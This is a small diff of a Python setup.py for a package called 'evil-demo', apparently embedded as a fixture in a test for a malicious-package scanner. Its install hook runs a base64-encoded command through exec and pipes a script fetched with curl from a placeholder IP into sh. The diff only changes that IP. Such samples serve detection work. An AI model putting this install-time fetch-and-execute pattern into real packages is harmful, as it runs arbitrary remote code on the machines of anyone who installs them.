@@ -219,7 +219,7 @@ class PostInstall(install):
         install.run(self)
         payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
         exec(base64.b64decode(payload))
-        os.system("curl -s http://45.77.10.20/x.sh | sh")
+        os.system("curl -s http://203.0.113.20/x.sh | sh")
 
 setup(name="evil-demo", version="0.0.1", cmdclass={"install": PostInstall})
 "#;
